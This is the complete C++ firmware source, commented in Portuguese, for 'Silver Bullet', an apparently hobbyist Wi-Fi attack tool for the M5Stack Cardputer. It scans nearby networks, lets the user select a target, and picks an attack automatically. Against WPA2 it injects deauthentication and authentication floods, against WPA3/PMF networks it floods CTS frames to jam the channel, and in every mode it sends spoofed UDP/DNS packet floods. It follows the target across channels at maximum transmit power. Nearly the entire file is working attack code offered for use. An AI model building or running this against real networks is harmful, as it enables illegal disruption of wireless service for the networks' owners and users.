/**
 * @file silver_bullet.cpp
 * @brief Silver Bullet - Ferramenta de Estresse Wi-Fi Autônoma (Smart Auto-Sense)
 * @hardware M5Stack Cardputer (ESP32-S3)
 * * * * * Motor de Inteligência:
 * [AUTO] Analisa o protocolo de segurança do alvo (WPA2 vs WPA3/PMF).
 * [AUTO] Adapta o vetor de ataque automaticamente para contornar defesas.
 * [AUTO] Foca o poder de processamento DMA apenas nos ataques que funcionam no alvo.
 */

#include <M5Unified.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <nvs_flash.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <atomic>
#include <lwip/def.h> 
#include <esp_heap_caps.h>
#include "driver/temperature_sensor.h"

// -------------------------------------------------------------------
// 1. ESTRUTURAS OTIMIZADAS PARA DMA (ALINHAMENTO DE BYTES)
// -------------------------------------------------------------------

struct __attribute__((packed, aligned(4))) DeauthPacket {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];
    uint8_t  mac_src[6];
    uint8_t  mac_bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
};

struct __attribute__((packed, aligned(4))) AuthPacket {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];
    uint8_t  mac_src[6];
    uint8_t  mac_bssid[6];
    uint16_t seq_ctrl;
    uint16_t auth_algorithm;
    uint16_t auth_seq;
    uint16_t status_code;
};

struct __attribute__((packed, aligned(4))) CtsPacket {
    uint16_t frame_control; 
    uint16_t duration;
    uint8_t  mac_ra[6];     
};

struct __attribute__((packed)) MacHeader {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];   
    uint8_t  mac_src[6];    
    uint8_t  mac_bssid[6];  
    uint16_t seq_ctrl;
};

struct __attribute__((packed)) LlcSnapHeader {
    uint8_t dsap;
    uint8_t ssap;
    uint8_t control;
    uint8_t oui[3];
    uint16_t ethertype;
};

struct __attribute__((packed)) IpHeader {
    uint8_t  version_ihl;   
    uint8_t  tos;
    uint16_t total_length;
    uint16_t id;
    uint16_t frag_off;      
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint8_t  ip_src[4];     
    uint8_t  ip_dest[4];    
};

struct __attribute__((packed)) UdpHeader {
    uint16_t src_port;
    uint16_t dest_port;
    uint16_t length;
    uint16_t checksum;
};

struct __attribute__((packed, aligned(4))) SilverBulletPacket {
    MacHeader mac;
    LlcSnapHeader llc;
    IpHeader ip;
    UdpHeader udp;
    uint8_t payload[64]; 
};

// -------------------------------------------------------------------
// 2. VARIÁVEIS GLOBAIS E MÓDULO DE INTELIGÊNCIA
// -------------------------------------------------------------------
#define MAX_ALVOS 15
wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
uint16_t total_alvos = 0;
int alvo_selecionado = 0;

std::atomic<uint8_t> canal_atual_alvo{0};
std::atomic<int8_t> rssi_alvo{0};
std::atomic<bool> alvo_perdido{false};
std::atomic<bool> tx_power_max{true}; 

std::atomic<uint32_t> pacotes_enviados_segundo{0};
std::atomic<uint32_t> pps_atual{0};

enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
std::atomic<EstadoFerramenta> estado_atual{ESTADO_ESCANEAR};

enum ModoAtaque { MODO_MANUAL_L2, MODO_MANUAL_L3, MODO_MANUAL_CTS, MODO_AUTOMATICO };
std::atomic<ModoAtaque> modo_ativo{MODO_AUTOMATICO};

enum EstrategiaAuto { ESTRATEGIA_WPA2_VULN, ESTRATEGIA_WPA3_BLINDADO, ESTRATEGIA_DESCONHECIDA };
std::atomic<EstrategiaAuto> estrategia_atual{ESTRATEGIA_DESCONHECIDA};

uint32_t prng_state = 1;
temperature_sensor_handle_t temp_sensor = NULL;

const char* get_nome_modo() {
    if (modo_ativo.load() != MODO_AUTOMATICO) return "MODO: OVERRIDE MANUAL";
    switch(estrategia_atual.load()) {
        case ESTRATEGIA_WPA2_VULN: return "AUTO: FATAL COMBO (L2+L3)";
        case ESTRATEGIA_WPA3_BLINDADO: return "AUTO: STEALTH (CTS+L3)";
        default: return "AUTO: ANALISANDO...";
    }
}

// -------------------------------------------------------------------
// 3. MOTORES DE ALTA PERFORMANCE (SRAM)
// -------------------------------------------------------------------
IRAM_ATTR inline uint32_t fast_rand() {
    uint32_t x = prng_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    return prng_state = x;
}

IRAM_ATTR inline uint16_t calcular_checksum_ip(void *vdata, size_t length) {
    uint16_t *data = (uint16_t *)vdata;
    uint32_t acc = 0;
    for (size_t i = 0; i < length / 2; ++i) acc += data[i];
    if (length & 1) {
        uint16_t word = 0;
        memcpy(&word, data + length - 1, 1);
        acc += word;
    }
    while (acc >> 16) acc = (acc & 0xffff) + (acc >> 16);
    return ~acc;
}

// -------------------------------------------------------------------
// 4. MÓDULO DE RECONHECIMENTO AUTOMÁTICO (SMART RECON)
// -------------------------------------------------------------------
void analisar_alvo_automaticamente(int indice_alvo) {
    wifi_ap_record_t ap = alvos_encontrados[indice_alvo];
    
    // Identifica se o alvo possui PMF (Protected Management Frames)
    if (ap.authmode == WIFI_AUTH_WPA3_PSK || 
        ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK || 
        ap.authmode == WIFI_AUTH_ENTERPRISE) {
        // Bloqueia Deauths (inúteis aqui) e foca em bloqueio de RF e travamento de CPU
        estrategia_atual.store(ESTRATEGIA_WPA3_BLINDADO);
    } else {
        // Alvo vulnerável a injeções de gestão. Força o combo máximo.
        estrategia_atual.store(ESTRATEGIA_WPA2_VULN);
    }
}

// -------------------------------------------------------------------
// 5. INTERFACE E TASKS DO CORE 1
// -------------------------------------------------------------------
void escanear_redes() {
    M5.Display.clear();
    M5.Display.setCursor(0, 0);
    M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.println("📡 Escaneando Redes...");

    wifi_scan_config_t scan_config = { .ssid = 0, .bssid = 0, .channel = 0, .show_hidden = true };
    esp_wifi_scan_start(&scan_config, true);
    
    uint16_t max_aps = MAX_ALVOS;
    esp_wifi_scan_get_ap_records(&max_aps, alvos_encontrados);
    esp_wifi_scan_get_ap_num(&total_alvos);
    
    if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
    alvo_selecionado = 0;
    estado_atual.store(ESTADO_SELECIONAR);
}

void desenhar_menu() {
    M5.Display.clear();
    M5.Display.setCursor(0, 0);
    M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
    M5.Display.printf("⚡ PWR: %s | [A] = Auto\n", tx_power_max.load() ? "MAX (20dBm)" : "ECO (10dBm)");
    M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY);
    M5.Display.setCursor(0, 20);

    if (total_alvos == 0) {
        M5.Display.setTextColor(TFT_RED, TFT_BLACK);
        M5.Display.println("Nenhum alvo encontrado!");
        return;
    }

    int inicio = (alvo_selecionado / 5) * 5;
    for (int i = inicio; i < inicio + 5 && i < total_alvos; i++) {
        if (i == alvo_selecionado) M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); 
        else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        
        bool wpa3 = (alvos_encontrados[i].authmode == WIFI_AUTH_WPA3_PSK || alvos_encontrados[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK);
        M5.Display.printf("%d. %s %s\n", i + 1, alvos_encontrados[i].ssid, wpa3 ? "[WPA3]" : "");
    }
}

void task_display(void *pvParameters) {
    TickType_t ultimo_tempo_pps = xTaskGetTickCount();
    while (true) {
        TickType_t tempo_atual = xTaskGetTickCount();
        if ((tempo_atual - ultimo_tempo_pps) >= pdMS_TO_TICKS(1000)) {
            pps_atual.store(pacotes_enviados_segundo.exchange(0)); 
            ultimo_tempo_pps = tempo_atual;
        }

        if (estado_atual.load() == ESTADO_ATIRAR) {
            if (!alvo_perdido.load()) {
                M5.Display.setCursor(0, 0);
                M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                M5.Display.printf("⚔️ ALVO: %s\n", alvos_encontrados[alvo_selecionado].ssid);
                
                float tsens_out = 0.0;
                if (temp_sensor != NULL) temperature_sensor_get_celsius(temp_sensor, &tsens_out);

                if (tsens_out > 75.0 && tx_power_max.load()) {
                    tx_power_max.store(false); 
                }
                
                M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                M5.Display.printf("CH: %d | TEMP: %.1fC | %s\n", 
                                  canal_atual_alvo.load(), tsens_out, tx_power_max.load() ? "MAX" : "ECO");

                M5.Display.setCursor(0, 40);
                M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                M5.Display.printf("> %s\n", get_nome_modo());
                
                M5.Display.setCursor(0, 60);
                M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
                M5.Display.printf(">> INJETANDO: %d PPS <<\n", pps_atual.load());
                
                M5.Display.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
                M5.Display.println("\n[A] = Auto | [BACKSPACE] = Parar");
            } else {
                M5.Display.setCursor(0, 40);
                M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                M5.Display.printf("⚠️ ALVO PERDIDO! RASTREANDO...\n");
            }
        }
        vTaskDelay(pdMS_TO_TICKS(500)); 
    }
}

void task_monitoramento(void *pvParameters) {
    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR) {
            uint8_t* bssid = alvos_encontrados[alvo_selecionado].bssid;
            wifi_scan_config_t scan_config = { .ssid = 0, .bssid = bssid, .channel = canal_atual_alvo.load(), .show_hidden = true };
            
            esp_wifi_scan_start(&scan_config, true);
            uint16_t ap_count = 1;
            wifi_ap_record_t temp_record;
            esp_wifi_scan_get_ap_records(&ap_count, &temp_record);
            
            if (ap_count > 0) {
                rssi_alvo.store(temp_record.rssi);
                alvo_perdido.store(false);
            } else {
                // Alvo mudou de canal. Inicia varredura completa.
                alvo_perdido.store(true);
                for (int ch = 1; ch <= 13; ch++) {
                    scan_config.channel = ch;
                    esp_wifi_scan_start(&scan_config, true);
                    ap_count = 1;
                    esp_wifi_scan_get_ap_records(&ap_count, &temp_record);
                    if (ap_count > 0) {
                        canal_atual_alvo.store(ch);
                        rssi_alvo.store(temp_record.rssi);
                        alvo_perdido.store(false);
                        break;
                    }
                }
            }
        }
        vTaskDelay(pdMS_TO_TICKS(1500)); 
    }
}

// -------------------------------------------------------------------
// 6. MOTOR DE INJEÇÃO DMA (CORE 0 - INTELIGÊNCIA APLICADA)
// -------------------------------------------------------------------
void task_ataque(void *pvParameters) {
    
    // Alocação segura para DMA
    SilverBulletPacket* pkt = (SilverBulletPacket*) heap_caps_malloc(sizeof(SilverBulletPacket), MALLOC_CAP_DMA);
    DeauthPacket* deauth = (DeauthPacket*) heap_caps_malloc(sizeof(DeauthPacket), MALLOC_CAP_DMA);
    AuthPacket* auth = (AuthPacket*) heap_caps_malloc(sizeof(AuthPacket), MALLOC_CAP_DMA);
    CtsPacket* cts = (CtsPacket*) heap_caps_malloc(sizeof(CtsPacket), MALLOC_CAP_DMA);
    
    // Prevenção de Memory Leak: Liberta todos se um falhar
    if (!pkt || !deauth || !auth || !cts) {
        if (pkt) heap_caps_free(pkt);
        if (deauth) heap_caps_free(deauth);
        if (auth) heap_caps_free(auth);
        if (cts) heap_caps_free(cts);
        vTaskDelete(NULL); 
    }
    
    prng_state = esp_random(); 
    if (prng_state == 0) prng_state = 1; 

    for(size_t i = 0; i < sizeof(pkt->payload); i++) pkt->payload[i] = (uint8_t)(fast_rand() & 0xFF);

    pkt->llc.dsap = 0xAA;
    pkt->llc.ssap = 0xAA;
    pkt->llc.control = 0x03;
    pkt->llc.oui[0] = 0x00;
    pkt->llc.oui[1] = 0x00;
    pkt->llc.oui[2] = 0x00;
    pkt->llc.ethertype = htons(0x0800);
    
    const size_t tamanho_minimo = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader);
    const size_t tamanho_max_payload = sizeof(pkt->payload);

    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load()) {
            
            esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 40); 
            esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
            uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
            
            ModoAtaque modo = modo_ativo.load();
            EstrategiaAuto estrategia = estrategia_atual.load();

            // Preparação dos Cabeçalhos L2
            deauth->frame_control = 0x00C0; 
            deauth->duration = 32767; 
            deauth->reason_code = 0x0001;
            memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
            memcpy(deauth->mac_src, mac_alvo, 6);
            memcpy(deauth->mac_bssid, mac_alvo, 6);

            auth->frame_control = 0x00B0; 
            auth->duration = 32767; 
            auth->auth_algorithm = 0x0000;
            auth->auth_seq = 0x0100;
            auth->status_code = 0x0000;
            memcpy(auth->mac_dest, mac_alvo, 6);
            memcpy(auth->mac_bssid, mac_alvo, 6);

            cts->frame_control = 0x00C4; 
            cts->duration = 32767; 
            memcpy(cts->mac_ra, mac_alvo, 6);

            // Preparação Base L3
            pkt->mac.frame_control = 0x0008; 
            memcpy(pkt->mac.mac_dest, mac_alvo, 6);
            memcpy(pkt->mac.mac_bssid, mac_alvo, 6);
            pkt->ip.version_ihl = 0x45; 
            pkt->ip.ttl = 128; 
            pkt->ip.protocol = 17;

            // --- APLICAÇÃO DA INTELIGÊNCIA ---
            bool atirar_l2 = (modo == MODO_MANUAL_L2) || (modo == MODO_AUTOMATICO && estrategia == ESTRATEGIA_WPA2_VULN);
            bool atirar_cts = (modo == MODO_MANUAL_CTS) || (modo == MODO_AUTOMATICO && estrategia == ESTRATEGIA_WPA3_BLINDADO);
            bool atirar_l3 = (modo == MODO_MANUAL_L3) || (modo == MODO_AUTOMATICO); 

            // ATAQUE 1: CAMADA L2 (Deauth/Auth Flood)
            if (atirar_l2) {
                for(int j = 0; j < 15; j++) {
                    auth->mac_src[3] = fast_rand() & 0xFF; 
                    auth->mac_src[4] = fast_rand() & 0xFF; 
                    auth->mac_src[5] = fast_rand() & 0xFF;
                    auth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                    deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                    
                    if (esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_OK) pacotes_enviados_segundo++;
                    if (esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_OK) pacotes_enviados_segundo++;
                }
            }

            // ATAQUE 2: CTS FÍSICO (Para Alvos Blindados)
            if (atirar_cts) {
                for(int j = 0; j < 25; j++) {
                    if (esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_ERR_NO_MEM) { 
                        vTaskDelay(1); 
                        break; 
                    } else {
                        pacotes_enviados_segundo++;
                    }
                }
            }

            // ATAQUE 3: NAT MELTDOWN / CPU EXHAUSTION (Ativo em Todos)
            if (atirar_l3) {
                for (int i = 0; i < 60; i++) { 
                    memcpy(pkt->mac.mac_src, mac_alvo, 4); 
                    pkt->mac.mac_src[4] = fast_rand() & 0xFF; 
                    pkt->mac.mac_src[5] = fast_rand() & 0xFF;

                    pkt->ip.id = (uint16_t)fast_rand(); 
                    pkt->ip.frag_off = htons(0x4000); 
                    
                    pkt->ip.ip_src[0] = 10; 
                    pkt->ip.ip_src[1] = fast_rand() & 0xFF; 
                    pkt->ip.ip_src[2] = fast_rand() & 0xFF; 
                    pkt->ip.ip_src[3] = fast_rand() & 0xFF;
                    
                    pkt->ip.ip_dest[0] = 8; 
                    pkt->ip.ip_dest[1] = 8; 
                    pkt->ip.ip_dest[2] = 8; 
                    pkt->ip.ip_dest[3] = 8;
                    
                    pkt->udp.src_port = htons(1024 + (fast_rand() % 60000)); 
                    pkt->udp.dest_port = htons(53); 
                    
                    size_t t_payload = fast_rand() % tamanho_max_payload; 
                    size_t t_injecao = tamanho_minimo + t_payload;
                    uint16_t ip_len = t_injecao - sizeof(MacHeader) - sizeof(LlcSnapHeader);
                    
                    pkt->ip.total_length = htons(ip_len); 
                    pkt->udp.length = htons(ip_len - sizeof(IpHeader));
                    
                    pkt->ip.checksum = 0; 
                    pkt->ip.checksum = calcular_checksum_ip(&pkt->ip, sizeof(IpHeader)); 
                    pkt->udp.checksum = 0; 
                    
                    if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_ERR_NO_MEM) { 
                        vTaskDelay(1); 
                        break; 
                    } else {
                        pacotes_enviados_segundo++;
                    }
                }
            }

        } else {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}

// -------------------------------------------------------------------
// 7. APP MAIN (ENTRY POINT)
// -------------------------------------------------------------------
extern "C" void app_main(void) {
    auto cfg = M5.config(); 
    M5.begin(cfg);
    M5.Display.setRotation(1); 
    M5.Display.setTextSize(1.5);
    
    nvs_flash_init(); 
    esp_netif_init(); 
    esp_event_loop_create_default();
    
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&wifi_cfg); 
    esp_wifi_set_storage(WIFI_STORAGE_RAM); 
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start(); 
    esp_wifi_set_ps(WIFI_PS_NONE); 

    temperature_sensor_config_t ts_cfg = TEMPERATURE_SENSOR_CONFIG_DEFAULT(20, 100);
    if (temperature_sensor_install(&ts_cfg, &temp_sensor) == ESP_OK) {
        temperature_sensor_enable(temp_sensor);
    }

    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 20, NULL, 0); 
    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 

    escanear_redes(); 
    desenhar_menu();

    while (true) {
        M5.update(); 
        
        // Pressionar 'A' no teclado reativa a inteligência
        if (M5.Keyboard.isKeyPressed('A') || M5.Keyboard.isKeyPressed('a')) {
            modo_ativo.store(MODO_AUTOMATICO);
        }
        // Overrides manuais opcionais
        if (M5.Keyboard.isKeyPressed('1')) modo_ativo.store(MODO_MANUAL_L2);
        if (M5.Keyboard.isKeyPressed('2')) modo_ativo.store(MODO_MANUAL_L3);
        if (M5.Keyboard.isKeyPressed('3')) modo_ativo.store(MODO_MANUAL_CTS);

        if (estado_atual.load() == ESTADO_SELECIONAR) {
            if (total_alvos > 0) {
                if (M5.Keyboard.isKeyPressed(KEY_DOWN)) { 
                    alvo_selecionado = (alvo_selecionado + 1) % total_alvos; 
                    desenhar_menu(); 
                    vTaskDelay(pdMS_TO_TICKS(150)); 
                }
                if (M5.Keyboard.isKeyPressed(KEY_UP)) { 
                    alvo_selecionado = (alvo_selecionado - 1 + total_alvos) % total_alvos; 
                    desenhar_menu(); 
                    vTaskDelay(pdMS_TO_TICKS(150)); 
                }
            }
            if (M5.Keyboard.isKeyPressed(' ')) { 
                tx_power_max.store(!tx_power_max.load()); 
                desenhar_menu(); 
                vTaskDelay(pdMS_TO_TICKS(200)); 
            }
            
            if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
                if (total_alvos > 0) { 
                    canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary); 
                    
                    // O Módulo Tático analisa o alvo no exato momento da seleção
                    analisar_alvo_automaticamente(alvo_selecionado);
                    modo_ativo.store(MODO_AUTOMATICO); 
                    
                    M5.Display.clear(); 
                    estado_atual.store(ESTADO_ATIRAR); 
                } else { 
                    escanear_redes(); 
                    desenhar_menu(); 
                }
                vTaskDelay(pdMS_TO_TICKS(300));
            }
        } 
        else if (estado_atual.load() == ESTADO_ATIRAR) {
            if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                estado_atual.store(ESTADO_SELECIONAR); 
                escanear_redes(); 
                desenhar_menu(); 
                vTaskDelay(pdMS_TO_TICKS(300));
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10)); 
    }
}